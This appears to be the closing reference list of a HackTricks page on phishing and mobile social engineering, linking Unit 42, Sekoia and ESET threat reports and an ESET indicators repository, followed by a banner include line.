- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
